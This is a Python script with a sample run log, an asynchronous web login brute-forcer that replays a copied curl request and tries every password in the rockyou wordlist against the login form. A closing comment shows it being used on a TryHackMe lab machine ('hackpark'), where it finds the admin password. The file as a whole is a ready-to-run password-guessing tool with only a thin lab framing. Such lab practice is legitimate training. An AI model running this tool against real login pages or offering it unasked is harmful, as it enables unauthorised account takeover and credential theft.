import aiohttp
import asyncio
import argparse
import urllib.parse
import json
import os
import re

"""
v1.2.1
tested in 
- python 3.10.6
- python 3.12.3

pip3 install aiohttp
"""


async def post(session, index, FUZZ, filter, semaphore, url, headers, payload_template):
    payload = {
        key: value.replace("FUZZ", FUZZ) if "FUZZ" in value else value
        for key, value in payload_template.items()
    }

    # CHECK PAYLOADS
    if headers.get("Content-Type") == "application/x-www-form-urlencoded":
        data = payload
    if headers.get("Content-Type") == "application/json":
        data = json.dumps(payload)

    async with semaphore:
        try:
            async with session.post(url, data=data, headers=headers) as response:
                text = await response.text()
                print(text)
                if filter in text:
                    response.status = 401
                    status = "Failed"
                else:
                    status = "CHECK THIS!"
                    print()
                    print("[!] POSSIBLE PASSWORD ")
                    print(f"{index}: {FUZZ}")
                    os._exit(1)

                LINE_CLEAR = "\x1b[2K"  # <-- ANSI sequence
                print(index, response.status, status, FUZZ, end="\r", flush=True)
                print(end=LINE_CLEAR)
                return response.status
        except Exception as e:
            print(f"[-] Request failed: {e}")
            return None


def read_file_to_array(file_path):
    expanded_path = os.path.expanduser(file_path)
    try:
        with open(expanded_path, "r", encoding="latin-1") as file:
            lines = file.readlines()
        return [line.strip() for line in lines]
    except Exception as e:
        print(f"Error reading file: {e}")
        return []


def parse_curl_command(file_path):
    with open(file_path, "r") as file:
        curl_command = file.read().strip()

    # Extract URL
    url_match = re.search(r"curl '([^']*)'", curl_command)
    url = url_match.group(1) if url_match else None

    # Extract headers
    headers = dict(re.findall(r"-H '([^:]*): ([^']*)'", curl_command))

    # Extract data
    data_match = re.search(r"--data-raw '([^']*)'", curl_command)
    raw_data = data_match.group(1) if data_match else None
    decoded_data = urllib.parse.unquote_plus(
        raw_data
    )  # Decode URL-encoded form data, converting + to spaces correctly
    data = dict(re.findall(r"([^=&]+)=([^&]*)", decoded_data))

    return url, headers, data


async def main(url, headers, payload, filter_string):
    file_path = "~/wordlists/rockyou.txt"
    password_list = read_file_to_array(file_path)
    concurrent_limit = 50
    semaphore = asyncio.Semaphore(concurrent_limit)

    tasks = []
    async with aiohttp.ClientSession() as session:
        for i in range(0, len(password_list), concurrent_limit):
            batch = password_list[i : i + concurrent_limit]

            for j, password in enumerate(batch):
                task = asyncio.ensure_future(
                    post(
                        session=session,
                        index=i + j,
                        FUZZ=password,
                        filter=filter_string,
                        semaphore=semaphore,
                        url=url,
                        headers=headers,
                        payload_template=payload,
                    )
                )
                tasks.append(task)

            responses = await asyncio.gather(*tasks)
            tasks = []  # Clear tasks for the next batch


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Parse curl command from a file")
    parser.add_argument(
        "--curl", type=str, help="File path of the curl command file", required=True
    )
    parser.add_argument(
        "--filter_string",
        type=str,
        help="String/Phrase when login page is unsuccesful",
        required=True,
    )
    args = parser.parse_args()

    url, headers, payload = parse_curl_command(args.curl)
    filter_string = args.filter_string
    """
    to add filter by: 
    - response size 
    - response status code
    """
    print("=" * 100)
    print("[+] WEB LOGIN BRUTEFORCE")
    print("\tauthor: @codeandrew")
    print("=" * 100)
    print("url:", url)
    print("headers:", json.dumps(headers, indent=4))
    print("payload:", json.dumps(payload, indent=4))
    print("filter_string:", json.dumps(filter_string, indent=4))
    print("=" * 100)
    asyncio.run(main(url, headers, payload, filter_string))

"""
targeting: https://tryhackme.com/r/room/hackpark
try logging and copy the curl command

╰─$ time python3 web/bruteforce.py --curl web/curl.sh --filter_string "Login failed"                                                                                               130 ↵
====================================================================================================
[+] WEB LOGIN BRUTEFORCE
        author: @codeandrew
====================================================================================================
url: http://10.10.152.224/Account/login.aspx?ReturnURL=%2fadmin%2f
headers: {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.152.224",
    "Referer": "http://10.10.152.224/Account/login.aspx?ReturnURL=/admin/",
    "Sec-GPC": "1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
}
payload: {
    "__VIEWSTATE": "84FrBo5Xcnlbl1zdPW0PQCTThN1ZPowMBvjKMp1WauBf7ikEpFscl1zasCI5rmj+W2SUBqcmUVN7YcLe3+GG8mHsfBJ800HZdxjCHtwtNTRdXeDj3A6Zq0TAidKKsRwfFa201Bu6OyUugEKvtt5ecxUG3LX2AI7gUJwrXnb+tz+/gS84",
    "__EVENTVALIDATION": "InSzgul1R7mNXSeW+wt4uUIiNPC9zMCFo5U43mwk67eZIYuIZRTIYcOOr08wBmBKeD47JhZH1VpBI3K7kJbGbq3YwlXu4TKpgdbCGKO3wUlKcCkSPuSxZIlJ8jiozqFR8MyrTky/Jd3qFqVN15TeTaXsxfX29tsqBQIzrRQr4DWNc3ib",
    "ctl00$MainContent$LoginUser$UserName": "admin",
    "ctl00$MainContent$LoginUser$Password": "FUZZ",
    "ctl00$MainContent$LoginUser$LoginButton": "Log in"
}
filter_string: "Login failed"
====================================================================================================
1445 401 Failed mamapapaeucho
 [!] CHECK THIS
FUZZ: 1qaz2wsx
python3 web/bruteforce.py --curl web/curl.sh --filter_string "Login failed"  1.52s user 0.32s system 7% cpu 23.149 total

"""
